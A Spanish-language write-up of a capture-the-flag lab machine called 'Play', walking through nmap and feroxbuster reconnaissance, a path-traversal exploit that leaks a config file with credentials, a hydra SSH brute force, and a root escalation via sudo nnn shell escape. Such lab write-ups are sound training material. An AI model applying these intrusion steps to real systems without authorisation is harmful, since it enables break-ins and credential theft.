# Máquina Play

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.153

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.153

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.153/ -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

entro en http://192.168.5.153/playlist/

![alt text](image-4.png)

veo la versión:

![alt text](image-7.png)

busco un exploit: https://www.exploit-db.com/exploits/45830

wfuzz -c --hc=404,500 --hl=30433 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://192.168.5.153/playlist/?getAlbum&parent=../FUZZ&album=Efe' 

![alt text](image-6.png)

entro en la ruta, y se me descarga un Efe.zip

descomprimos el archivo Efe.zip:

y veo el archivo config.php:

![alt text](image-12.png)

![alt text](image-5.png)

hacemos fuerza bruta con hydra para encontrar el usuario:

hydra -L /usr/share/seclists/Usernames/Names/names.txt -p aprendemos ssh://192.168.5.153 -t 64 -I

Encontramos al usuario andy

### Explotación 

me conecto por ssh con las credenciales encontradas:

![alt text](image-8.png)

### Escalar privilegios

![alt text](image-9.png)

cuando ejecuto sudo /usr/bin/nnn se abre una ventana y presiono la tecla shift + ":" luego escribimos !/bin/bash y listo somos root

### user.txt

![alt text](image-10.png)

### root.txt

![alt text](image-11.png)